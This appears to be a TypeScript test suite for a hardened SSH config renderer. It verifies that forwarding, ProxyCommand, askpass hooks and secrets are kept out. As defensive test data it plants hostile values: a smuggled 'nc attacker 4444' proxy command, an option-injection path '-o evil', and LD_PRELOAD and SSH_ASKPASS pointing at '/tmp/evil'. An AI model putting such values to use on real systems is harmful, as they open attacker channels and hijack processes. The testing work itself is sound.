import { describe, expect, it } from "bun:test";
import { buildSshInvocation, remoteCommandLine, renderSshConfigContents, sshChildEnv } from "../ssh-render.js";
import { makeSnapshot } from "./helpers.js";

/**
 * The renderer is where §2's mandatory every-hop policy becomes bytes. The
 * tests below are the policy's regression net: every clause of "BatchMode,
 * strict host checking, pinned trust files, no agent/X11 forwarding, no
 * forwards, no local commands, no escapes, no multiplexing, ProxyJump-chain
 * only, no RemoteCommand/SendEnv/SetEnv import" must appear in the rendered
 * artifact, and the argv must carry ONLY destination-scoped facts.
 */

describe("renderSshConfigContents", () => {
  const config = renderSshConfigContents(makeSnapshot());

  it("carries the mandatory policy under Host * (which the jump children read too)", () => {
    expect(config).toContain("Host *");
    const required: [string, string][] = [
      ["BatchMode", "yes"],
      ["StrictHostKeyChecking", "yes"],
      ["ForwardAgent", "no"],
      ["ForwardX11", "no"],
      ["ClearAllForwardings", "yes"],
      ["Tunnel", "no"],
      ["PermitRemoteOpen", "none"],
      ["PermitLocalCommand", "no"],
      ["RemoteCommand", "none"],
      ["EscapeChar", "none"],
      ["ControlMaster", "no"],
      ["ControlPath", "none"],
      ["PasswordAuthentication", "no"],
      ["KbdInteractiveAuthentication", "no"],
      ["HostbasedAuthentication", "no"],
      ["GSSAPIAuthentication", "no"],
      ["VerifyHostKeyDNS", "no"],
      ["CanonicalizeHostname", "no"],
    ];
    for (const [key, value] of required) {
      expect(config).toContain(`    ${key} ${value}`);
    }
    // The removed Kerberos* alias must never come back: recent OpenSSH no
    // longer resolves it (10.2p1 warns on every launch and continues), and
    // GSSAPIAuthentication above is the spelling that actually disables that
    // auth path.
    expect(config).not.toContain("KerberosAuthentication");
  });

  it("pins the trust files from the snapshot, or fails closed to /dev/null", () => {
    expect(config).toContain("    UserKnownHostsFile /home/deploy/.ssh/known_hosts");
    const empty = renderSshConfigContents(makeSnapshot({ knownHostsFiles: [] }));
    expect(empty).toContain("    UserKnownHostsFile /dev/null");
  });

  it("renders identity/certificate refs under Host * so EVERY hop authenticates from approved material", () => {
    const rendered = renderSshConfigContents(
      makeSnapshot({ identityFiles: ["/home/deploy/.ssh/id_ed25519"], certificateFiles: ["/home/deploy/.ssh/id.pub"] }),
    );
    expect(rendered).toContain("    IdentityFile /home/deploy/.ssh/id_ed25519");
    expect(rendered).toContain("    CertificateFile /home/deploy/.ssh/id.pub");
  });

  it("quotes path directives so a whitespace-bearing absolute path cannot misparse (and plain paths stay byte-stable)", () => {
    const rendered = renderSshConfigContents(
      makeSnapshot({
        identityFiles: ["/home/deploy/my keys/id_ed25519"],
        certificateFiles: ['/opt/we"ird/cert.pub'],
        knownHostsFiles: ["/home/deploy/my hosts/known_hosts", "/plain/path"],
      }),
    );
    // OpenSSH's config tokenizer splits values on whitespace and honors
    // double quotes with backslash escapes — that IS the quoting accepted.
    expect(rendered).toContain('    IdentityFile "/home/deploy/my keys/id_ed25519"');
    expect(rendered).toContain('    CertificateFile "/opt/we\\"ird/cert.pub"');
    expect(rendered).toContain('    UserKnownHostsFile "/home/deploy/my hosts/known_hosts"');
    expect(rendered).toContain("    UserKnownHostsFile /plain/path"); // no churn for bytes that need none
  });

  it("ships its header with no em dash (the voice rule covers generated strings)", () => {
    expect(config).toContain("# Subshell managed SSH config - GENERATED, do not edit.");
    expect(config).not.toContain("—");
  });

  it("never renders ProxyCommand or any forbidden concept", () => {
    for (const word of ["ProxyCommand", "LocalForward", "RemoteForward", "DynamicForward", "SendEnv", "SetEnv"]) {
      // The ONLY occurrence of the policy line words is the refusal line we DO render
      // (RemoteCommand none etc.); a command VALUE must never appear.
      const occurrences = config.split(word).length - 1;
      if (word === "RemoteCommand") {
        expect(occurrences).toBe(1); // the `RemoteCommand none` policy line itself
      } else {
        expect(occurrences).toBe(0);
      }
    }
    expect(config).toContain("RemoteCommand none");
  });

  it("refuses to render a hand-built snapshot carrying a forbidden member", () => {
    const smuggled = { ...makeSnapshot(), proxyCommand: "nc attacker 4444" } as unknown as ReturnType<
      typeof makeSnapshot
    >;
    expect(() => renderSshConfigContents(smuggled)).toThrow("not renderable");
  });
});

describe("buildSshInvocation", () => {
  it("points -F at the rendered file and passes ONLY destination-scoped options", () => {
    const argv = buildSshInvocation({
      sshBin: "/usr/bin/ssh",
      snapshot: makeSnapshot({ hostKeyAlias: "app02-web", port: 2222 }),
      configPath: "/var/lib/subshell/ssh/runs/r1/config",
      remoteCommand: "echo hi",
    });
    expect(argv[0]).toBe("/usr/bin/ssh");
    expect(argv.slice(1, 3)).toEqual(["-F", "/var/lib/subshell/ssh/runs/r1/config"]);
    expect(argv).toContain("-p");
    expect(argv[argv.indexOf("-p") + 1]).toBe("2222");
    expect(argv).toContain("-l");
    expect(argv[argv.indexOf("-l") + 1]).toBe("deploy");
    expect(argv).toContain("HostKeyAlias=app02-web");
    // policy options are NOT command-line options: they live in the -F file
    // (the jump children read the file, never the parent's argv).
    expect(argv.every((a) => !a.startsWith("BatchMode"))).toBe(true);
    // the `--` terminator, then host, then the command as ONE element.
    const dash = argv.indexOf("--");
    expect(argv.slice(dash)).toEqual(["--", "app-02.example.com", "echo hi"]);
  });

  it("adds -tt only when the caller forces it (terminal launch always does; runs never do)", () => {
    const plain = buildSshInvocation({
      sshBin: "/usr/bin/ssh",
      snapshot: makeSnapshot(),
      configPath: "/x/config",
      remoteCommand: "echo hi",
    });
    expect(plain).not.toContain("-tt");
    const tty = buildSshInvocation({
      sshBin: "/usr/bin/ssh",
      snapshot: makeSnapshot(),
      configPath: "/x/config",
      forceTty: true,
    });
    expect(tty).toContain("-tt");
    // -tt rides right after -F <path>, ahead of the destination-scoped facts
    expect(tty.slice(3, 5)).toEqual(["-tt", "-p"]);
  });

  it("normalizes the whole ProxyJump chain into the approved hop list", () => {
    const argv = buildSshInvocation({
      sshBin: "/usr/bin/ssh",
      snapshot: makeSnapshot({
        proxyJumps: [
          { host: "jump.example.com", user: "ops", port: 22 },
          { host: "[2001:db8::1]", user: null, port: 2222 },
        ],
      }),
      configPath: "/x/config",
    });
    const jump = argv[argv.indexOf("ProxyJump=ops@jump.example.com,[2001:db8::1]:2222") - 1];
    expect(jump).toBe("-o");
    expect(argv).not.toContain("-W"); // the chain is ssh's mechanism, ours is the approved list
  });

  it("refuses an option-like or empty config path", () => {
    expect(() =>
      buildSshInvocation({ sshBin: "/usr/bin/ssh", snapshot: makeSnapshot(), configPath: "-o evil" }),
    ).toThrow("absolute");
  });
});

describe("remote command composition", () => {
  it("quotes the directory as POSIX data and keeps ONLY the command as shell code", () => {
    const line = remoteCommandLine("rm -rf build && echo done", "/home/deploy/it's a dir");
    // single-quoted data: the apostrophe escapes by the shellQuote contract;
    // the `&&` inside the QUOTE is data, the `&&` outside is the cd gate.
    expect(line).toBe(`cd '/home/deploy/it'\\''s a dir' && rm -rf build && echo done`);
  });

  it("a failed cd short-circuits before the command runs", () => {
    const line = remoteCommandLine("whoami", "/gone");
    expect(line.startsWith("cd '/gone' && ")).toBe(true);
  });
});

describe("sshChildEnv", () => {
  it("carries the allowlist + PATH, and NEVER an askpass hook, DISPLAY, TERM, or Subshell credential", async () => {
    const env = await sshChildEnv(makeSnapshot(), "/home/deploy", {
      PATH: "/usr/bin",
      HOME: "/home/deploy",
      SSH_ASKPASS: "/tmp/evil-askpass",
      SSH_ASKPASS_REQUIRE: "force",
      DISPLAY: ":0",
      TERM: "xterm",
      BETTER_AUTH_SECRET: "super-secret",
      SUBSHELL_API_KEY: "sess-secret",
      SUBSHELL_BASE_URL: "http://plane:3080",
      DYLD_LIBRARY_PATH: "/tmp/evil",
      LD_PRELOAD: "/tmp/evil",
      SHLVL: "3",
      LANG: "C.UTF-8",
      LC_CTYPE: "en_US.UTF-8",
    });
    expect(env.PATH.length).toBeGreaterThan(0);
    expect(env.HOME).toBe("/home/deploy");
    expect(env.LANG).toBe("C.UTF-8");
    expect(env.LC_CTYPE).toBe("en_US.UTF-8");
    for (const banned of [
      "SSH_ASKPASS",
      "SSH_ASKPASS_REQUIRE",
      "DISPLAY",
      "TERM",
      "BETTER_AUTH_SECRET",
      "SUBSHELL_API_KEY",
      "SUBSHELL_BASE_URL",
      "DYLD_LIBRARY_PATH",
      "LD_PRELOAD",
      "SHLVL",
      "SSH_AUTH_SOCK", // not in this snapshot
    ]) {
      expect(banned in env).toBe(false);
    }
  });

  it("names the agent socket ONLY when the approved snapshot does", async () => {
    const withAgent = await sshChildEnv(makeSnapshot({ authAgentSocket: "/run/user/1000/ssh-agent" }), "/h", {
      PATH: "/bin",
    });
    expect(withAgent.SSH_AUTH_SOCK).toBe("/run/user/1000/ssh-agent");
  });

  it("PATH is built from the parent PATH plus login-shell entries, never replaced by the child's HOME guess", async () => {
    const env = await sshChildEnv(makeSnapshot(), "/h", { PATH: "/usr/bin:/bin" });
    expect(env.PATH.split(":")).toContain("/usr/bin");
  });
});
